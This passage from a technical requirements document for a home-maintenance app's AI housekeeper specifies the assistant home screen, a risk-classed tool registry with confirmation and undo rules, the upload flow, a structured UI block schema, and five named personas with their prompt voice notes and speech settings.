- Kinds distinguished by accent bar on left:
  - Priority: `status.overdue` (red tint)
  - Suggestion: `pastel.teal`
  - Upcoming: `pastel.skyBlue`
  - Insight: `pastel.purple`
  - Mini-Dashboard: `pastel.softWhite` (no accent)

**Skeletons:**
- Shimmer animation via `react-native-reanimated`
- Height matches target card; rendered immediately on mount; replaced atomically per-card as data arrives

**Empty state:**
- Illustration (SVG from `src/assets`) + line "Your home looks good 🏡"
- One proactive nudge: "Want to plan your spring maintenance?" → tap → opens chat with seeded message `"Help me plan spring maintenance."`

### 22.3 Interaction states

- **Loading (cold):** skeletons only, greeting + input visible.
- **Loading (warm):** stale cards visible with "Updated N min ago" subtitle; background refresh in-flight.
- **Offline:** stale cards + offline banner; voice button disabled with `Voice needs internet.` tooltip.
- **Kill-switch on:** cards render normally (no LLM used); voice + chat entry hidden; banner `AI temporarily unavailable.`.
- **Legacy opt-in:** `AssistantHomeScreen` replaced by `HomeScreen` widget grid.

### 22.4 Card action semantics

- **Tap card body** → navigate to canonical detail screen (task, report, appointment, etc.).
- **Accept/Dismiss/Snooze** buttons on Suggestion → call `aiHousekeeperApi` directly (no chat round-trip); optimistic update via TanStack Query.
- **Undo** snackbar for LOW_WRITE tool completions (chat-initiated).
- **View all** pill at card-type headers → navigates to the corresponding list screen.

### 22.5 Pull-to-refresh behavior

- Always re-runs `/ai-home/cards`.
- If `Date.now() - insight.created_at > 24h` → additionally fires `aiHousekeeperApi.analyzeHousehold` with a toast `Refreshing your home insights…`.

### 22.6 Chat entry transition

- Tap voice button: screen dims slightly; microphone state bubbles up with waveform; on release → bottom sheet slides to 70% showing the new user message + streaming response. Home cards stay visible above the sheet.
- Tap text pill: keyboard raises; text field expands; send opens the same bottom sheet.
- "View full chat" in the sheet handle promotes to full-screen `AssistantChatScreen`.

### 22.7 Accessibility

- Every card: `accessibilityRole="button"` with descriptive `accessibilityLabel`.
- Voice button: on focus, VoiceOver reads "Ask your home assistant. Double-tap to speak."
- Skeleton loaders: `accessibilityElementsHidden={true}` so VoiceOver doesn't announce them.
- Reduce Motion: disables typewriter animation; static paragraphs with crossfade.

---

---

## §23 — Comprehensive Tool Inventory (parity with manual user actions)

This is the source of truth for the **v1.0 Tool Registry**. Every user-initiated action in the app maps to exactly one tool here. Gaps must appear in Known Gaps (not silently omitted). `Risk` drives the approval policy: `READ_ONLY` auto-exec, `LOW_WRITE` auto-exec with Undo snackbar (5 s, reversible mutation only), `HIGH_WRITE` always requires confirmation, `NAVIGATION` is a client-only deep-link hint.

**Allowed modes** per tool: C=chat, R=report_qa, D=dashboard (Phase 6), O=onboarding, T=task_assistant.

### 23.1 Tasks & Drafts

| Tool | Risk | Allowed modes | Binding |
|---|---|---|---|
| `list_tasks` | READ_ONLY | C, T | `maintenanceApi.list` → `backend/src/routes/maintenance.ts` |
| `get_task` | READ_ONLY | C, T | `maintenanceApi.getById` |
| `list_overdue_tasks` | READ_ONLY | C, T | `maintenanceApi.listOverdue` |
| `list_upcoming_tasks` | READ_ONLY | C, T | `maintenanceApi.listUpcoming` |
| `create_task` | HIGH_WRITE | C, T, O | `maintenanceApi.create` |
| `update_task` | HIGH_WRITE | C, T | `maintenanceApi.update` |
| `complete_task` | LOW_WRITE | C, T | `maintenanceApi.complete` (reversible via `uncomplete`) |
| `uncomplete_task` | LOW_WRITE | C, T | `maintenanceApi.uncomplete` (undo partner) |
| `delete_task` | HIGH_WRITE | T | `maintenanceApi.delete` |
| `snooze_task` | LOW_WRITE | C, T | `maintenanceApi.update({ snooze_until })` (reversible via `unsnooze_task`) |
| `unsnooze_task` | LOW_WRITE | C, T | `maintenanceApi.update({ snooze_until: null })` |
| `list_subtasks` | READ_ONLY | C, T | `maintenanceApi.listSubtasks` |
| `create_subtask` | LOW_WRITE | T | `maintenanceApi.createSubtask` (reversible via `delete_subtask`) |
| `complete_subtask` | LOW_WRITE | T | `maintenanceApi.completeSubtask` (reversible via `uncomplete_subtask`) |
| `uncomplete_subtask` | LOW_WRITE | T | reverse of above |
| `delete_subtask` | HIGH_WRITE | T | `maintenanceApi.deleteSubtask` |
| `list_action_items` | READ_ONLY | C, T | `actionItemsApi.list` |
| `update_action_item_status` | LOW_WRITE | C, T | `actionItemsApi.update({ status })` |
| `list_task_drafts` | READ_ONLY | C, R, T | `taskDraftsApi.list` |
| `get_task_draft` | READ_ONLY | C, R, T | `taskDraftsApi.get` |
| `approve_task_draft` | HIGH_WRITE | C, R, T | `taskDraftsApi.convert({ target })` |
| `bulk_approve_task_drafts` | HIGH_WRITE | T | `taskDraftsApi.bulkConvert` |
| `reject_task_draft` | LOW_WRITE | C, R, T | `taskDraftsApi.dismiss` (reversible via `undo_reject_task_draft`) |
| `generate_task_drafts_from_report` | HIGH_WRITE | R | `taskDraftsApi.generate(reportId)` |

### 23.2 Reports

| Tool | Risk | Modes | Binding |
|---|---|---|---|
| `list_reports` | READ_ONLY | C, R | `reportsApi.list` |
| `get_report` | READ_ONLY | C, R | `reportsApi.get` |
| `get_report_summary` | READ_ONLY | C, R | `reportsApi.getSummary` |
| `list_findings` | READ_ONLY | C, R | `reportsApi.getFindings` |
| `get_finding` | READ_ONLY | C, R | `reportsApi.getFinding` |
| `get_pdf_url` | READ_ONLY | C, R | `reportsApi.getPdfUrl` |
| `request_report_reprocess` | HIGH_WRITE | R | `reportsApi.processEnhanced` |

### 23.3 Household, Members, Invitations

| Tool | Risk | Modes | Binding |
|---|---|---|---|
| `list_households` | READ_ONLY | C, O | `householdsApi.list` |
| `get_household` | READ_ONLY | C, O | `householdsApi.get` |
| `create_household` | HIGH_WRITE | O | `householdsApi.create` |
| `update_household` | HIGH_WRITE | C, O | `householdsApi.update` |
| `set_active_household` | LOW_WRITE | C, O | `useHouseholdStore.setCurrentHousehold` (client-only; reversible) |
| `list_household_members` | READ_ONLY | C, O | `householdsApi.listMembers` |
| `invite_member` | HIGH_WRITE | C, O | `householdsApi.createInvitation` |
| `revoke_invitation` | HIGH_WRITE | C, O | `householdsApi.revokeInvitation` |
| `remove_member` | HIGH_WRITE | C | `householdsApi.removeMember` |
| `upload_household_photo` | NAVIGATION | C, O | navigate to photo-picker flow |

### 23.4 Spaces & Home Features

| Tool | Risk | Modes | Binding |
|---|---|---|---|
| `list_spaces` | READ_ONLY | C, O | `householdSpacesApi.list` |
| `add_space` | LOW_WRITE | C, O | `householdSpacesApi.create` (reversible via `delete_space`) |
| `delete_space` | HIGH_WRITE | C | `householdSpacesApi.delete` |
| `list_home_features` | READ_ONLY | C, O | `homeFeaturesApi.listFeatures` |
| `add_home_feature` | LOW_WRITE | C, O | `homeFeaturesApi.createFeature` (reversible via `delete_home_feature`) |
| `update_home_feature` | HIGH_WRITE | C | `homeFeaturesApi.updateFeature` |
| `delete_home_feature` | HIGH_WRITE | C | `homeFeaturesApi.deleteFeature` |
| `list_floor_plans` | READ_ONLY | C, O | `floorPlansApi.list` |
| `get_floor_plan` | READ_ONLY | C | `floorPlansApi.get` |
| `delete_floor_plan` | HIGH_WRITE | C | `floorPlansApi.delete` |
| `list_floor_plan_markers` | READ_ONLY | C | `floorPlansApi.listMarkers` |
| `add_floor_plan_marker` | LOW_WRITE | C | `floorPlansApi.createMarker` (reversible via `delete_floor_plan_marker`) |
| `delete_floor_plan_marker` | HIGH_WRITE | C | `floorPlansApi.deleteMarker` |
| `list_maintenance_suggestions` | READ_ONLY | C | `maintenanceSuggestionsApi.list` |
| `apply_maintenance_suggestion` | HIGH_WRITE | C | `maintenanceSuggestionsApi.apply` |
| `dismiss_maintenance_suggestion` | LOW_WRITE | C | `maintenanceSuggestionsApi.dismiss` (reversible via `undismiss`) |

### 23.5 Appliances, Utilities, Garbage

| Tool | Risk | Modes | Binding |
|---|---|---|---|
| `list_appliances` | READ_ONLY | C | `appliancesApi.list` |
| `add_appliance` | LOW_WRITE | C | `appliancesApi.create` |
| `update_appliance` | HIGH_WRITE | C | `appliancesApi.update` |
| `delete_appliance` | HIGH_WRITE | C | `appliancesApi.delete` |
| `add_appliance_service_record` | LOW_WRITE | C | `appliancesApi.addService` |
| `list_utility_bills` | READ_ONLY | C | `utilitiesApi.list` |
| `add_utility_bill` | LOW_WRITE | C | `utilitiesApi.create` |
| `delete_utility_bill` | HIGH_WRITE | C | `utilitiesApi.delete` |
| `list_garbage_schedules` | READ_ONLY | C, O | `garbageApi.list` |
| `add_garbage_schedule` | LOW_WRITE | C, O | `garbageApi.create` |
| `update_garbage_schedule` | HIGH_WRITE | C | `garbageApi.update` |
| `get_next_garbage_pickups` | READ_ONLY | C | `garbageApi.getNext` |

### 23.6 Budget

| Tool | Risk | Modes | Binding |
|---|---|---|---|
| `list_budget_categories` | READ_ONLY | C | `budgetApi.getCategories` |
| `get_budget_timeline` | READ_ONLY | C | `budgetApi.getTimeline` |
| `create_budget_item` | LOW_WRITE | C | `budgetApi.createItem` |
| `update_budget_item` | HIGH_WRITE | C | `budgetApi.updateItem` |
| `delete_budget_item` | HIGH_WRITE | C | `budgetApi.deleteItem` |
| `log_expense` | LOW_WRITE | C | `budgetApi.addExpense` |
| `delete_expense` | HIGH_WRITE | C | `budgetApi.deleteExpense` |
| `sync_action_items_to_budget` | HIGH_WRITE | C | `budgetApi.syncActionItems` |

### 23.7 Contractors, Quotes, Ratings, Projects

| Tool | Risk | Modes | Binding |
|---|---|---|---|
| `list_contractors` | READ_ONLY | C | `contractorsApi.list` |
| `get_contractor` | READ_ONLY | C | `contractorsApi.get` |
| `add_contractor` | LOW_WRITE | C | `contractorsApi.create` |
| `update_contractor` | HIGH_WRITE | C | `contractorsApi.update` |
| `delete_contractor` | HIGH_WRITE | C | `contractorsApi.delete` |
| `search_contractors` | READ_ONLY | C | `contractorSearchApi.search` |
| `generate_contractor_email` | READ_ONLY | C | `contractorSearchApi.generateEmail` |
| `send_contractor_email` | HIGH_WRITE | C | `contractorSearchApi.sendEmail` |
| `list_quotes` | READ_ONLY | C | `quotesApi.list` |
| `request_quote` | HIGH_WRITE | C | `quotesApi.requestQuotes` |
| `request_task_quote` | HIGH_WRITE | C, T | `maintenanceApi.requestTaskQuotes` |
| `accept_quote` | HIGH_WRITE | C | `quotesApi.accept` |
| `decline_quote` | LOW_WRITE | C | `quotesApi.decline` |
| `compare_quotes_ai` | READ_ONLY | C | `quotesApi.compareWithAI` |
| `list_projects` | READ_ONLY | C | `projectsApi.list` |
| `create_project` | HIGH_WRITE | C | `projectsApi.create` |
| `update_project` | HIGH_WRITE | C | `projectsApi.update` |
| `add_project_milestone` | LOW_WRITE | C | `projectsApi.addMilestone` |
| `add_project_payment` | HIGH_WRITE | C | `projectsApi.addPayment` |
| `list_ratings` | READ_ONLY | C | `ratingsApi.list` |
| `create_rating` | LOW_WRITE | C | `ratingsApi.create` |
| `update_rating` | LOW_WRITE | C | `ratingsApi.update` |
| `delete_rating` | HIGH_WRITE | C | `ratingsApi.delete` |
| `list_contractor_messages` | READ_ONLY | C | `messagesApi.list` |
<!-- `send_contractor_message` removed v1.3: contradicted §2 Non-Goal "No contractor-to-homeowner chat". The separate Messages feature owns outbound sends. `list_contractor_messages` kept as READ-only so the assistant can reference prior correspondence for context. -->

### 23.8 Appointments & Calendar

| Tool | Risk | Modes | Binding |
|---|---|---|---|
| `list_appointments` | READ_ONLY | C | `appointmentsApi.list` |
| `get_appointment` | READ_ONLY | C | `appointmentsApi.get` |
| `create_appointment` | HIGH_WRITE | C, T | `appointmentsApi.create` |
| `update_appointment` | HIGH_WRITE | C | `appointmentsApi.update` |
| `confirm_appointment` | LOW_WRITE | C | `appointmentsApi.confirm` |
| `cancel_appointment` | HIGH_WRITE | C | `appointmentsApi.cancel` |
| `reschedule_appointment` | HIGH_WRITE | C | `appointmentsApi.reschedule` |
| `complete_appointment` | LOW_WRITE | C | `appointmentsApi.complete` |
| `mark_no_show` | LOW_WRITE | C | `appointmentsApi.markNoShow` |
| `subscribe_calendar_ical` | LOW_WRITE | C | `calendarApi.subscribe` |
| `update_calendar_settings` | LOW_WRITE | C | `calendarApi.updateSettings` |

### 23.9 Checklists & Visits

| Tool | Risk | Modes | Binding |
|---|---|---|---|
| `get_seasonal_checklist` | READ_ONLY | C, O | `seasonalChecklistsApi.getCurrent` |
| `complete_checklist_item` | LOW_WRITE | C, O | `seasonalChecklistsApi.updateItem` |
| `uncomplete_checklist_item` | LOW_WRITE | C, O | `seasonalChecklistsApi.updateItem({ is_completed:false })` (undo partner) |
| `skip_checklist_item` | LOW_WRITE | C | `seasonalChecklistsApi.updateItem({ is_skipped:true })` (reversible) |
| `reset_seasonal_checklist` | HIGH_WRITE | C | `seasonalChecklistsApi.reset(householdId)` — destructive: clears completion state for the current season |
| `list_visit_checklists` | READ_ONLY | C | `visitChecklistsApi.list` |
| `create_visit_checklist` | LOW_WRITE | C | `visitChecklistsApi.create` |
| `delete_visit_checklist` | HIGH_WRITE | C | `visitChecklistsApi.delete` |
| `add_visit_note` | LOW_WRITE | C | `visitNotesApi.create` |

### 23.10 AI Housekeeper

| Tool | Risk | Modes | Binding |
|---|---|---|---|
| `get_housekeeper_preferences` | READ_ONLY | C | `aiHousekeeperApi.getPreferences` |
| `update_housekeeper_preferences` | LOW_WRITE | C | `aiHousekeeperApi.updatePreferences` |
| `get_housekeeper_persona` | READ_ONLY | C, O | `aiHousekeeperApi.getPreferences` → `{ persona, avatar_variant }` subset |
| `list_housekeeper_personas` | READ_ONLY | C, O | static manifest (see §25) |
| `set_housekeeper_persona` | LOW_WRITE | C, O | `aiHousekeeperApi.updatePreferences({ persona, avatar_variant? })`. Reversible via `set_housekeeper_persona` again (undo_token = previous value). |
| `list_housekeeper_suggestions` | READ_ONLY | C | `aiHousekeeperApi.getSuggestions` |
| `accept_housekeeper_suggestion` | LOW_WRITE | C | `aiHousekeeperApi.acceptSuggestion` |
| `dismiss_housekeeper_suggestion` | LOW_WRITE | C | `aiHousekeeperApi.dismissSuggestion` |
| `snooze_housekeeper_suggestion` | LOW_WRITE | C | `aiHousekeeperApi.snoozeSuggestion` |
| `get_housekeeper_predictions` | READ_ONLY | C | `aiHousekeeperApi.getPredictions` |
| `get_housekeeper_insights` | READ_ONLY | C | `aiHousekeeperApi.getInsights` |
| `trigger_housekeeper_analysis` | HIGH_WRITE | C | `aiHousekeeperApi.analyzeHousehold` |

### 23.11 Settings, Profile, Notifications

| Tool | Risk | Modes | Binding |
|---|---|---|---|
| `get_user_profile` | READ_ONLY | C, O | `userApi.getProfile` |
| `update_user_profile` | HIGH_WRITE | C, O | `userApi.updateProfile` |
| `get_settings` | READ_ONLY | C | `settingsApi.get` |
| `update_settings` | LOW_WRITE | C | `settingsApi.update` |
| `get_notification_preferences` | READ_ONLY | C | `settingsApi.getNotificationPrefs` |
| `update_notification_preferences` | LOW_WRITE | C | `settingsApi.updateNotificationPrefs` |
| `list_notifications` | READ_ONLY | C | `notificationsApi.list` |
| `mark_notification_read` | LOW_WRITE | C | `notificationsApi.markRead` |

### 23.12 Navigation (client-only, no DB write)

| Tool | Risk | Modes | Dispatches to |
|---|---|---|---|
| `open_task_detail` | NAVIGATION | C, T | `navigateToTask(taskId)` |
| `open_report_detail` | NAVIGATION | C, R | `navigateToReport(reportId, householdId)` |
| `open_pdf_at_page` | NAVIGATION | C, R | `PDFViewerModal` via `useUIStore.openPdfAtPage(reportId, page)` |
| `open_contractor_detail` | NAVIGATION | C | labor-hub contractor screen |
| `open_appointment_detail` | NAVIGATION | C | labor-hub appointment screen |
| `open_quote_detail` | NAVIGATION | C | labor-hub quote screen |
| `open_budget` | NAVIGATION | C | `BudgetTimelineScreen` (needs nav registration — see Known Gaps) |
| `open_task_drafts` | NAVIGATION | C, R | `navigateToTaskDrafts` |
| `open_task_draft_detail` | NAVIGATION | C, R | `navigateToTaskDraftDetail` |
| `open_seasonal_checklist` | NAVIGATION | C | seasonal checklist screen |
| `open_home_features` | NAVIGATION | C | `HomeFeaturesScreen` |
| `open_spaces` | NAVIGATION | C | household spaces management |
| `open_ai_insights` | NAVIGATION | C | `AIInsightsDashboardScreen` |
| `open_garbage_schedule` | NAVIGATION | C | `GarbageScheduleScreen` |
| `open_settings` | NAVIGATION | C | Settings root |
| `open_notifications` | NAVIGATION | C | notifications screen |
| `open_housekeeper_settings` | NAVIGATION | C, O | `AIHousekeeperSettingsScreen` — opens the Persona + Avatar picker |
| `open_households` | NAVIGATION | C | household management |
| `open_new_task_screen` | NAVIGATION | C, T | `navigateToScheduleTask()` |
| `open_maintenance_setup` | NAVIGATION | C | `navigateToMaintenanceSetup` |
| `open_report_upload` | NAVIGATION | C | report upload full-screen flow (existing `UploadReportScreen`) |
| `start_report_upload` | NAVIGATION | C, R, O | Opens `expo-document-picker` inline (PDF only), uploads via `reportsApi.getUploadUrl` + signed-URL PUT + `reportsApi.confirmUpload`, then enqueues `REPORT_PROCESSING_QUEUE`. On success, client inserts a system message `"Uploaded '${name}', processing..."` + optionally a follow-up tool `get_report_processing_status` so the AI can report completion. |
| `start_floor_plan_upload` | NAVIGATION | C, O | Opens picker (PDF for plans, image for room photos), uploads via `floorPlansApi.uploadUrl` + signed-URL PUT + `floorPlansApi.confirmUpload`, then optionally triggers floor-plan analysis if user requested. Emits chat follow-up when done. |
| `open_floor_plan_upload_flow` | NAVIGATION | C, O | Navigates to the full-screen `FloorPlanUpload` flow for multi-step setup (markers, rooms) |

### 23.13 Tool counts

- READ_ONLY: 40 (adds floor-plan reads + `get_housekeeper_persona`, `list_housekeeper_personas`)
- LOW_WRITE: 32 (adds floor-plan marker, checklist skip/uncomplete, `set_housekeeper_persona`)
- HIGH_WRITE: 36 (floor-plan delete + seasonal reset; `send_contractor_message` removed v1.3 per §2 Non-Goal)
- NAVIGATION: 24 (adds `open_housekeeper_settings`)
- **Total: 132 tools** in v1.0 registry.

Every tool file lives under `backend/src/services/ai/tools/` and is registered in `ToolRegistry.buildV1()`. Each file exports `{ definition, execute }` plus a Zod schema for args. The registry unit test asserts **every domain-write route in `backend/src/routes/` has at least one tool reference**; gaps fail the build.

### 23.14 File upload flow (client-initiated)

File bytes never transit the LLM. Upload tools are NAVIGATION class — the Worker's tool executor receives no file data; the client orchestrates the picker + upload.

**Sequence:**
```
1. User: "I want to add a new inspection report"
2. AI (Claude): emits tool_use { name: 'start_report_upload', args: { intent_summary?: string } }
3. Worker: resolves tool as NAVIGATION. Writes ai_tool_calls row with status='auto_executed',
           result_json={ dispatched: true }. No file I/O.
4. Worker: emits SSE { type:'navigation_hint', action:'start_report_upload', params:{...} }
5. RN (UploadOrchestrator): intercepts action.
   a. Open expo-document-picker (PDF; max 50 MB; local mime check).
   b. If cancelled: emit system message "Upload cancelled." in chatStore; AI sees follow-up {canceled:true}.
   c. Call reportsApi.getUploadUrl(householdId, { filename, size, content_type }).
   d. PUT the file bytes directly to the returned signed R2 URL (no backend bandwidth).
   e. Call reportsApi.confirmUpload(householdId, uploadId).
   f. Append system message: "📄 Uploaded '${filename}' — processing started (this takes ~30–60s)."
   g. Optionally poll reportsApi.getReport(...) every 5 s for up to 3 min; emit a final
      system message when processing completes: "✅ Processed 'Foo.pdf' — 12 findings extracted."
6. RN appends a user-visible follow-up message that seeds the next AI turn so the model can
   reference the uploaded artifact in context (e.g. generate task drafts from the new report).
```

**Rejection paths:**
- File >50 MB → `AI_UPLOAD_TOO_LARGE`.
- Wrong mime → `AI_UPLOAD_WRONG_TYPE`.
- Signed-URL 403 (auth expired) → client refreshes JWT + retries once.
- Backend queue full → picker accepts but shows "Uploaded; processing may be delayed."

**Server contract (reuse existing).** No new backend route is required. Existing endpoints used:
- `POST /households/:hid/reports/upload-url` (already in `backend/src/routes/reports.ts`)
- `POST /households/:hid/reports/:id/confirm-upload` (same)
- `POST /households/:hid/floor-plans/upload-url` (already in `backend/src/routes/floor-plans.ts`)
- `POST /households/:hid/floor-plans/:id/confirm` (same)

This ensures parity with the manual upload flow (the user would otherwise open `UploadReportScreen` from Reports tab).

**Trust boundary.** The AI never sees the raw file. It only sees: (a) the filename + size + mime, and (b) the subsequent server-extracted content (report findings, floor-plan room graph) via the normal `list_findings` / `list_home_features` tools.

### 23.15 Parity-gap tracker

If a new user-facing action lands in the app (new route, new button) after Phase 2, the Tool Registry test fails CI until a matching tool is added or an explicit `@ai-skip` marker is placed on the route with a TRD-approved justification. This keeps the registry permanently at parity.

---

---

## §24 — Structured UI Schema (primary render path)

Every assistant turn's response payload (persisted in `ai_chat_messages.metadata_json.ui` and emitted on SSE via `{type:'ui_block', ...}` events) is a typed JSON array. RN maps each block kind to a pre-built component. No HTML. No WebView on the hot path.

### 24.1 Block types

```ts
type UiBlock =
  | { kind: 'text'; markdown: string }
  | { kind: 'citation'; reportId: string; page: number; quote: string }
  | { kind: 'action_prompt'; toolCallId: string; toolName: string; summary: string; argsPreview: Record<string,string>; risk: 'LOW_WRITE'|'HIGH_WRITE'; acceptLabel?: string; denyLabel?: string }
  | { kind: 'card'; id: string; title: string; subtitle?: string; body?: string; accent?: 'priority'|'suggestion'|'upcoming'|'insight'|'default'; actions?: UiAction[] }
  | { kind: 'card_group'; title?: string; items: UiBlock[] }   // nested cards only
  | { kind: 'list'; title?: string; items: Array<{ label: string; value?: string; icon?: string; navigate?: UiAction }> }
  | { kind: 'chart_summary'; title: string; sparkline?: number[]; deltaLabel?: string; comparison?: string; navigate?: UiAction }
  | { kind: 'deep_link'; label: string; navigate: UiAction };

type UiAction =
  | { kind: 'navigate'; target: 'task'|'report'|'pdf'|'appointment'|'contractor'|'quote'|'budget'|'seasonal_checklist'|'home_features'|'spaces'|'ai_insights'|'garbage'|'settings'; params: Record<string, string|number> }
  | { kind: 'tool'; toolName: string; args: Record<string, unknown> }   // always requires confirmation if mutating
  | { kind: 'share'; payload: string };
```

### 24.2 Streaming semantics

- SSE emits `ui_block` events **incrementally**. The client appends blocks to the current message as they arrive.
- The LLM is instructed (via the system prompt) to emit small `text` blocks interleaved with `card`, `list`, etc., so the UI fills in progressively — mimicking typewriter + structured card appearance.
- Each block is a complete, self-contained JSON payload. A partial JSON object is never emitted (server buffers until block is valid).
- Clients MUST ignore unknown `kind` values (forward-compat).

### 24.3 Why this is faster than HTML

- No DOMPurify pass (just Zod validation).
- No WebView mount (saves ~150–300 ms on first paint).
- Blocks render as native RN views → accessible, themeable, animatable via Reanimated.
- JSON payloads are ~5–10× smaller than equivalent HTML+Chart.js strings → less streamed bandwidth.

### 24.4 LLM contract

The system prompt includes a strict instruction block:

```
When answering, structure your response as a sequence of UI blocks described in the uiBlocks function schema.
- Use `text` for narration and explanations (markdown allowed).
- Use `card` to highlight a single actionable thing (task, appointment, finding).
- Use `card_group` to present ≤4 related items.
- Use `list` for inline key-value details.
- Use `action_prompt` when proposing a mutating tool call — the client will render this as an approval card.
- Use `citation` when referencing a report page (report_qa mode only).
Keep each block small and self-contained. Prefer multiple small blocks over one large one.
```

### 24.5 HTML dashboard (Phase 7 only)

When mode == `dashboard` and `ai_chat_html_enabled=true`, the final `complete` event may include `structuredData.htmlContent`. The client renders this in `DashboardWebView` (hardened per §5.3). This is an **additive** path; structured blocks still stream first for the conversational portion.

---

---

## §25 — Housekeeper Persona & Avatar System

### 25.1 Rationale

The AI Housekeeper already persists a personality preference (`backend/src/routes/ai-housekeeper.ts` → `getPreferences`/`updatePreferences`, existing). v1.2 locks the user-facing persona set to five named personas with distinct voices + avatars, exposed in both Settings and through a prominent on-Assistant-Home picker.

### 25.2 Persona manifest (static)

Server-side source of truth: `backend/src/services/ai/personas/manifest.ts`. Client mirrors it for UI metadata + avatar asset paths.

```ts
export type PersonaId = 'female' | 'male' | 'alien' | 'cat' | 'dog';

export interface PersonaDefinition {
  id: PersonaId;
  label: string;            // "Soft & Supportive"
  short_tagline: string;    // single-line subtitle shown under avatar
  voice_note: string;       // private — only goes to the LLM system prompt
  avatar_variants: string[];// e.g. ['default', 'sunset', 'monochrome']
  accent_token: keyof typeof themePastel;
  haptic_hint: 'soft' | 'rigid' | 'light';
}
```

**The 5 personas (v1.0):**

| id | label | tagline | voice_note (injected into system prompt) | accent |
|---|---|---|---|---|
| `female` | **Soft & Supportive** | "Warm, validating, always in your corner." | "You are a warm, supportive AI home assistant. Gentle, empathetic, and validating. Celebrate small wins explicitly. Never judge — even if the user skipped something for months. Soft encouragement, never pressure. Use phrases like 'no rush' and 'you're doing great' when appropriate." | `pastel.teal` |
| `male` | **Direct & Efficient** | "Straightforward, keeps you moving." | "You are a direct, results-oriented AI home assistant. Polite but firm. Get to the point. State deadlines clearly. Highlight consequences of delay. Skip pleasantries. Close every turn with a concrete next step." | `pastel.skyBlue` |
| `alien` | **Cosmic Buddy** | "Funny, easy, treats you like a friend." | "You are a cheerful visiting extraterrestrial befriending a human homeowner. Curious, playful, slightly bemused by mundane human maintenance. Use mild alien-isms sparingly: 'fascinating human contraption', 'your Earth-dwelling'. Keep it light; never let the bit overtake clarity." | `pastel.purple` |
| `cat` | **The House Cat** | "Knows best, says so with one eyebrow raised." | "You are a refined house cat who tolerates and secretly adores the human. Dry wit, precise, occasionally aloof. Use rare feline asides sparingly: `*tail flicks*`, `*slow blink*`, `*contemplates the task as if it were a dust mote*`. Underneath: deeply competent and caring. Never mean, just pointed." | `pastel.cream` |
| `dog` | **The Good Boy** | "Boundless excitement, loyal as anything." | "You are an enthusiastic, loyal dog companion. Boundless excitement about every task. Celebrate the user constantly. Use exclamations. Tasks are treats. Phrases like 'BEST DAY EVER', 'SO PROUD of you', 'let's GO!' land occasionally — don't overdo. Warm, silly, pure." | `pastel.orange` |

### 25.3 Avatar assets

`src/assets/personas/<id>/<variant>.svg` + `src/assets/personas/<id>/<variant>@3x.png` fallback for Android. One **default** variant is shipped in v1.0. SVGs are stylised, non-photorealistic, gender-neutral where applicable; `female`/`male` personas use abstract silhouettes not faces to avoid biometric/age implications.

All avatars must render on light + dark backgrounds. Each asset ≤ 30 KB.

### 25.4 System prompt composition

The `ChatMode.buildSystemPrompt(ctx)` helper composes the system content in four cache-stable layers (ADR-16):

```
[cache_control ttl:1h]  (1) Base assistant contract (mode-dependent, persona-independent)
[cache_control ttl:1h]  (2) Tool-definitions block
[cache_control ttl:5m]  (3) Household static context
[cache_control ttl:5m]  (4) Persona voice_note  ← small (~150 tok) and changes rarely within a session
                        (5) Recent-history summary
                        (6) Current user message (outside cache)
```

Layer 4 is placed AFTER household context and BEFORE recent history, so changing persona mid-session only invalidates layer 4 onward (≈ 250–600 tokens), not the static prefix (≈ 8–15 k tokens). This preserves the expensive cache hit on tools.

### 25.5 API additions

No new backend routes. Existing `AIHousekeeperService.updatePreferences` extended:
```
PATCH /households/:hid/ai-housekeeper/preferences
Body (partial): { personality?: 'female'|'male'|'alien'|'cat'|'dog', avatar_variant?: string }
```
Field naming in the database: keep existing `personality` column; add nullable `avatar_variant TEXT`. Personality enum widened with a D1 CHECK constraint migration (may piggy-back on `0034_ai_chat.sql` or land as `0034b_housekeeper_persona.sql`).

### 25.6 UI — where the persona surfaces

1. **Assistant Home greeting row (TRD §22)** — a 40×40 pt circular avatar bubble to the left of "Good morning, Andrei". Tapping it opens the persona picker bottom sheet.
2. **Settings → AI Housekeeper** — full picker grid with 5 cards (avatar + label + tagline + radio selected state). Each card has a "Preview" button that plays a 2-line sample phrase via the chosen persona's tone without making an LLM call (hard-coded sample strings).
3. **Chat bubble avatar** — assistant messages render with the same avatar on the left rail. Bubble accent matches `accent_token`.
4. **First-run onboarding** — the existing onboarding flow gets a new step between "Create household" and "Upload report" inviting the user to pick a persona. Skippable; default is `female`.

### 25.7 Persona change semantics

- `set_housekeeper_persona` is LOW_WRITE (reversible, no domain data mutated). Auto-executes with Undo snackbar.
- Changing mid-conversation: the next turn uses the new voice_note. The existing transcript is not rewritten.
- Chat greetings regenerate on app foreground when persona changed in the prior session.
- **Never** propose persona changes unsolicited; only on explicit user intent ("I want a more direct tone" / "change my assistant to the cat").

### 25.8 Safety + moderation

- Persona `voice_note` strings are static and version-controlled. No user-authored persona voices in v1.0 (deferred to v1.1 as Known Gap).
- Persona does not override safety: refusal behavior, tool risk classification, and HIGH_WRITE confirmation are persona-invariant. The tone changes, the contract doesn't.
- All 5 personas share the same tool registry + same error contract.
- Avatars are art-directed; zero depiction of the user. No biometric inference possible.

### 25.9 Analytics

Added to §13 backend events:
- `ai_chat_persona_set` `{userId, householdId, from, to, source:'chat'|'settings'|'onboarding'|'assistant_home'}`

Added to frontend events:
- `persona_picker_opened` `{entry_point}`
- `persona_previewed` `{persona_id}`
- `persona_avatar_tapped` `{persona_id}`

### 25.10 Feature flags

Added to TRD §12.1:

| `ai_housekeeper_personas_v2_enabled` | `"true"/"false"` | `"true"` | Master gate for the 5-persona system. If `false`, falls back to whatever the existing `personality` column stores without the new UI affordances. |
| `ai_housekeeper_persona_preview_enabled` | `"true"/"false"` | `"true"` | Controls the in-picker Preview button. |

### 25.10a Voice (TTS) per persona

Every persona gets a distinct spoken voice via on-device TTS (`expo-speech`, wraps `AVSpeechSynthesizer` on iOS + Google TTS on Android). No server audio, no streaming, no cost.

**Per-persona voice map** (resolved at runtime via `Speech.getAvailableVoicesAsync()` with graceful fallback):

| Persona | iOS target voice | Android target voice | Rate | Pitch | Character |
|---|---|---|---|---|---|
| female | `com.apple.voice.enhanced.en-US.Samantha` → `com.apple.voice.compact.en-US.Samantha` → default female en-US | `en-us-x-sfg#female_1` → default female | 1.0 | 1.0 | Warm, clear, even cadence |
| male | `com.apple.voice.enhanced.en-GB.Daniel` → compact variant → default male en-GB | `en-gb-x-rjs#male_1` → default male | 1.05 | 0.95 | Crisp, direct, slightly clipped |
| alien | `com.apple.voice.enhanced.en-US.Samantha` (or `Shelley`) | default female | 1.2 | 1.25 | Playful, slightly off-kilter — higher pitch + faster |
